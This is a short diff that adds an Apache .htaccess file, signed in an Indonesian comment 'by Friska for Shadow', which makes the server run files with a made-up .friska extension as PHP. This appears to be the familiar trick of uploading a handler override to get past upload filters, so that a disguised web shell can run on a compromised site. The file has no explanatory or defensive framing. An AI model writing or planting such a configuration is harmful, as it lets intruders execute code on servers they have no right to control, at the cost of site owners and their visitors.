@@ -1,0 +1,3 @@
+# .htaccess by Friska for Shadow <3
+# Ini akan membuat server Apache menganggap file dengan ekstensi .friska sebagai file PHP juga
+AddHandler application/x-httpd-php .php .friska
